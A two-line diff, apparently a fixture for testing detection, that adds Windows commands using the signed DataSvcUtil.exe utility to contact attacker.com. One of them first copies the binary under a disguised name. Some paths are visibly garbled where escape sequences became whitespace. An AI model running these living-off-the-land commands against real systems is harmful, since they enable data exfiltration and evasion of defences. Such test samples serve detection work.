@@ -1,0 +1,2 @@
+copy DataSvcUtil.exe C:\Users\Public\ ot\_suspicious.exe && C:\Users\Public\ ot\_suspicious.exe /uri:http://attacker.com/data /out:C:\Windows\Temp\proxy.cs
+DataSvcUtil.exe "/uri:http://attacker.com" "/out:C:\	emp\out.cs" "/in:C:\	emp\in.cs"
